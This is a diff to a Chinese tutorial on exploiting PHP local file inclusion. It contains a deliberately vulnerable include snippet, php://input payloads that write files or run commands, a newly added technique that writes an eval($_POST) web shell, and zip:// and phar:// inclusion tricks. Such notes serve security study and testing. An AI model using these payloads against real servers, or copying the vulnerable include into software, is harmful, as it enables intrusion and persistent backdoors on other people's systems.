@@ -32,9 +32,7 @@ include 和 require 语句是相同的，除了错误处理方面：
 # 包含姿势
 测试代码
 ```php
-<?php
 include $_GET["file"];
-?>
 ```
 
 <br>
@@ -65,6 +63,17 @@ php://input可以获取POST的数据流。当它与包含函数结合时，php:/
 | 增加一句话   | `<?php fputs(fopen("shell.php","a"),"<?php phpinfo();?>") ?>` |
 | 增加文件     | `<?php fputs(fopen("shell.php","w"),"<?php phpinfo();?>") ?>` |
 | 执行系统命令 | `<?php system('ipconfig') ?>`                                 |
+
+**注意**
+在尝试的时候发现了一个问题，当写入`<?php fputs(fopen("shells.php","w"),"<?php eval($_GET[a]) ?>")  ?>`时，`$_GET[a]`会被执行(其他一样)，如果在url中没有a参数，则写入的内容会是`<?php eval() ?>`，后来想到一种方式，既然`$_GET[a]`会被执行，那么我就在构造一个a参数，如下
+```
+http://localhost:8088/shell.php?file=php://input&a=$_POST[a]
+[POST DATA]
+<?php fputs(fopen("shells.php","w"),"<?php eval($_GET[a]) ?>")  ?>
+
+最终写入的结果会是 <?php eval($_POST[a]) ?>
+```
+
 
 <br>
 
@@ -328,13 +337,13 @@ include $file.".php";
 ### 利用协议
 利用`zip://`和`phar://`，由于整个压缩包都是我们的可控参数，那么只需要知道他们的后缀，便可以自己构建。
 
-####zip://
+#### zip://
 ```
 [访问参数]   ?file=zip://D:\zip.jpg%23phpinfo
 [拼接后]     ?file=zip://D:\zip.jpg#phpinfo.php
 ```
 
-####phar://
+#### phar://
 ```
 [访问参数]   ?file=phar://zip.zip/phpinfo
 [拼接后]     ?file=phar://zip.zip/phpinfo.php
